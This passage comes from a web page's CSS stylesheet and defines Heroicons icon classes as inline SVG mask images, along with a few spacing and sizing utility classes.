  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607'/%3E%3C/svg%3E")
}

.ps-3 {
  padding-inline-start: .75rem;
}

.ps-10 {
  padding-inline-start: 2.5rem;
}

.i-heroicons-x-mark-20-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E")
}

.i-heroicons-x-mark-20-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E")
}

.i-heroicons-arrow-path,
.i-heroicons-arrow-path-20-solid {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.i-heroicons-arrow-path {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99'/%3E%3C/svg%3E")
}

.i-heroicons-x-mark-20-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E")
}

.i-heroicons-minus-20-solid,
.i-heroicons-x-mark-20-solid {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.w-5 {
  width: 1.25rem;
}

.h-5 {
  height: 1.25rem;
}

.i-heroicons-exclamation-triangle-20-solid,
.i-heroicons-eye {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.i-heroicons-exclamation-triangle-20-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath fill-rule='evenodd' d='M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625zM10 5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 10 5m0 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2' clip-rule='evenodd'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath fill-rule='evenodd' d='M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625zM10 5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 10 5m0 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2' clip-rule='evenodd'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath fill-rule='evenodd' d='M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625zM10 5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 10 5m0 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2' clip-rule='evenodd'/%3E%3C/svg%3E")
}
</style>
